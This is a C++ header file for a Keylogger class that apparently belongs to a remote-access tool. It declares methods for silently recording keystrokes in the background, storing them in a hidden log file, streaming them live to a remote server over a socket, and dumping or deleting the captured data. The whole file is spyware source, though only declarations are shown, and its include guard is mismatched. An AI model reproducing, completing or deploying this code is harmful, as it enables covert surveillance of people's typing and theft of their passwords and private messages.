#ifndef KEYLOGG_H
#define KEYLOG_H

#include "master.h"

using namespace std;


class Keylogger
{
    public:

        Keylogger();
        //-----------------------------------------------
        VOID setup();
        //-----------------------------------------------
        BOOL silenciousBackgroundRunning = FALSE; //test if the "silentThread" is currently alive. 
        BOOL directSendKeystrokeRunning = FALSE; //directSendKeystroke
        //-----------------------------------------------
        wstring specialKey(INT &keystroke);
        wstring intToUnicode(INT keystroke);
        //-----------------------------------------------
        VOID directTcp();  //sends live keystrokes to the server.

        static DWORD WINAPI sendKeystrokeThread(LPVOID param); // start thread directSendKeystroke
        static DWORD WINAPI recvDataThread(LPVOID param); //start thread directRecvData
        
        VOID directRecvData(); //waiting for the end of the mod keylogger 
        VOID directSendKeystroke(); //sends keystrokes 
        //-----------------------------------------------        
        static DWORD WINAPI silenciousThread(LPVOID param); //start thread keyboardListeningAndWriteFile
        INT silenciousStart(); //return 1 if error.  | In case of error the silent mod will not work. 
        INT silenciousStop();  //return 1 if error | returns 1 if the silencious thread is not started. 
        INT silenciousDelete();
        HANDLE silenciousCreateFile(DWORD *ERROR_CODES); //Create a file to store the keystrokes. Then hide the file.  Return NULL if error
        VOID silenciousHideFile();

        VOID silenciousKeyboardListeningAndWriteFile(); // for silenciousBackground
        VOID silenciousWriteKeystrokeInFile(CONST wstring &keystroke, CONST HANDLE &hFile);  //listens to the keystrokes and writes the result to the file.
        
        vector <string> dumpAllData();// Returns all the data from the file that contains the keystrokes. 
        //-----------------------------------------------
        VOID setSocket(SOCKET &sock);
        VOID setPathLogFile();
        //-----------------------------------------------
        BOOL iHavePermissionToWrite(); //Test if the program can create the log.txt file. 
        //-----------------------------------------------
        ~Keylogger();
        
    private:
        
        SOCKET a_sock;
        CONST WCHAR a_log_file[8] = L"log.txt";
        wstring a_path_log_file;
        HWND a_WindowHandle;
        DWORD a_dwThreadId;
        HKL a_hkl;
     
};
//DWORD WINAPI directTcp(LPVOID param)
#endif